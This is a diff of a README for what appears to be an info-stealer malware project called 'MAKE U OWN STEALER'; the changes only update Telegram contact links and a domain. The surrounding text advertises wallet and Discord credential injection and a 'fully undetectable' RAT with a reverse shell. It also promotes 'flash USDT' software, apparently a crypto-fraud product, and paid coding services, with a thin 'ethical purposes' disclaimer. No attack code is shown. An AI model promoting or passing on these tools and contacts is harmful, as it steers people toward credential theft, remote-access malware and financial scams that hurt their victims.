@@ -1,7 +1,7 @@
 # MAKE U OWN STEALER  !! 
 ## 📍 New Update
-telegram: https://t.me/prysmax # flash Usdt 
-https://t.me/lawxszchannel
+telegram: https://t.me/prysmaxsoftware # flash Usdt 
+https://t.me/lawxszdev
 ####   🌟 STARR FOR MORE UPDATES ❤️ 
    - 🌟 If you want to compile your file go to the Prysmax repository and compile it for free and easy! - [Prysmax Compilator](https://github.com/Lawxsz/prysmax)
 
@@ -39,7 +39,7 @@ https://t.me/lawxszchannel
 - 💉 Exodus Injection (password), Discord Injection
 - NEW RAT FUD (REVERSE SHELL AND MORE)
 - 💸 with Fully Undetectable,bot builder , api server   @Lawxsz
-- prysmaxsoftware.cloud
+- prysmax.cloud
 
 # DISCLAIMER 📛 
 - This repository is for ethical purposes and to use the scripts to learn and improve in python :)
@@ -48,5 +48,5 @@ https://t.me/lawxszchannel
 # 🛠️ Coding Services - Contact 🛠️
 - **Telegram:** https://t.me/Lawxsz
 - **Discord:** Lawxsz#5963
--  https://t.me/lawxszchannel
+-  https://t.me/lawxszdev
 Flash Software 
